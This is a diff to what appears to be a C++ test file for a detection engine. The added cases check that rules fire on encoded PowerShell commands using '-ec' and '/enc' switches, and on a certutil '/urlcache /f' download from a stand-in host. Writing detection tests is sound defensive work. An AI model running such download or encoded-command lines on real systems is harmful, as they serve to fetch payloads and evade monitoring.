@@ -29,6 +29,11 @@ int main(int argc,char** argv) {
     auto state=engine.snapshot(); check(state["processes"].size()==3,"retained generations");
     check(state["processes"][1]["active"]==false,"old PID generation closed");
     check(state["processes"][2]["id"]=="200:6","unique generation");
+    // powershell.exe accepts -ec, unambiguous prefixes and a "/" switch character; certutil takes "/" too
+    Engine variants(rules);
+    check(has(variants.consume(start(1,11,"powershell.exe","powershell -ec VABFAFMAVAA=")),"RS-002"),"-ec alias");
+    check(has(variants.consume(start(2,12,"pwsh.exe","pwsh /enc VABFAFMAVAA=")),"RS-002"),"slash switch");
+    check(has(variants.consume(start(3,13,"certutil.exe","certutil /urlcache /f http://x.test/a a")),"RS-005"),"certutil slash switch");
     Engine false_positives(rules);
     check(false_positives.consume(start(1,1,"powershell.exe","powershell -File C:\\scripts\\-encodedcommand.ps1")).empty(),"switch token boundary");
     check(false_positives.consume(start(2,2,"mshta.exe","mshta C:\\local.hta")).empty(),"local hta");
